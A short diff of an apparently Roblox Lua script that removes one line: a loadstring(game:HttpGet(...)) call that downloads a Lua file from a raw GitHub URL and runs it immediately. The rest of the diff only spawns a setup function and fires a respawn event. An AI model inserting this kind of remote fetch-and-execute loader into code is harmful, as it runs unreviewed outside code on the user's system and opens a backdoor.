@@ -25,7 +25,6 @@ local function createTrainingPlatform()
 end
 
 task.spawn(createTrainingPlatform)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/theplayer8000/Client-X/main/Stats.lua", true))()
 task.wait(2)
 game.ReplicatedStorage.RemoteEvent:FireServer({"Respawn"})
 task.wait(3)
